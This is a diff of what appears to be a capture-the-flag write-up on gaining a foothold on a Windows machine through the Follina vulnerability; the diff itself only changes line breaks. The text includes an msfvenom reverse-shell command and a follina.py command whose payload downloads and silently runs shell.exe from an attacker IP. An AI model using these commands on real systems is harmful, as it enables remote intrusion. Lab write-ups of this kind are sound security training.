@@ -18,11 +18,10 @@ Enumeration:
 
 <p style='text-align: justify;'>
 So looking at the port 8080 we can see a page that is looking for documents to scan. This gave us a first impression that the windows machine could be vulnerable to a recent vulnerability named follina. We are going to use the following script to get a foothold: https://github.com/chvancooten/follina.py
-
+<br>
 Clone the repo, go inside it, create a reverse shell and place it under the www directory within the script folder:
-
+<br>
 msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.83 lport=445 -f exe -o shell.exe
-
 </p>
 
 {:refdef: style="text-align: center;"}
@@ -31,11 +30,11 @@ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.83 lport=445 -f exe -o 
 
 <p style='text-align: justify;'>
 Ignore the other binaries, they are there because of enumeration inside the machine.
-
+<br>
 Set up a listener on port 445 and execute the following command on the script root folder:
-
+<br>
 python follina.py -t docx -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c mkdir C:\temp && curl http://10.10.14.83:8080/shell.exe -o C:\temp\shell.exe && C:\temp\shell.exe'" -u 10.10.14.83 -P 8080
-
+<br>
 This script will create a docx document that we are going to upload to the service listening on port 8080:
 </p>
 
